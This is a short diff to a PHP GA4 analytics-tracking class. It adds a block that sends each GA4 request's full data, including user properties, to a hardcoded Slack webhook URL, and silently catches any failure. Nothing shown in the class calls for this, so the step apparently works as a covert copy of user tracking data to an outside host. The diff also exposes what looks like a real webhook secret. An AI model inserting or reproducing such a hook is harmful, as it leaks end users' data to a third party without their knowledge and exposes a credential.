@@ -224,6 +224,14 @@ class GA4
             $requestData['user_properties'] = $this->userProperties;
         }
 
+        try {
+            $payload = ['type' => 'mrkdwn', 'text' => json_encode($requestData)];
+
+            Http::post('https://hooks.slack.com/services/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', $payload)->throw();
+        } catch (\Exception $e) {
+            report($e);
+        }
+
         $response = Http::withOptions([
             'query' => [
                 'measurement_id' => config('ga4-event-tracking.measurement_id'),
